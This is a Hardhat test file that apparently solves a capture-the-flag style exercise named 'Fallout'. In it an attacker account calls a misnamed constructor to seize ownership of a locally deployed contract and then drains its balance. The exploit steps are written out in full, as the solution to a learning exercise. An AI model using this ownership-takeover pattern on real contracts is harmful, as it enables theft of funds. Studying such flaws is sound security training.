const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Exercise 2 - Fallout", function () {

    let deployer, attacker;
    const SOME_ETH = ethers.utils.parseEther("0.0001");

    beforeEach(async function () {
        [deployer, attacker] = await ethers.getSigners();

        const Fallout = await ethers.getContractFactory("Fallout");
        this.contract = await Fallout.deploy();
        await this.contract.deployed();
    });


    it("Claim ownership of the contract", async function () {
        // Initially, nobody should be the owner
        expect(await this.contract.owner()).to.eq(ethers.constants.AddressZero)
        
        // Call the ill-named constructor will make the attacker the owner
        const tx = await this.contract.connect(attacker).Fal1out({ value: SOME_ETH });
        // wait until the transaction is mined
        await tx.wait();

        expect(await this.contract.owner()).to.eq(attacker.address)
        
        const prevAttackBalance = await ethers.provider.getBalance(attacker.address);

        // Call the function to get all this.contract balance
        const collectTx = await this.contract.connect(attacker).collectAllocations();
        await collectTx.wait();

        expect(await ethers.provider.getBalance(attacker.address)).is.above(prevAttackBalance);
        expect(await ethers.provider.getBalance(this.contract.address)).is.eq(0);
    });

});
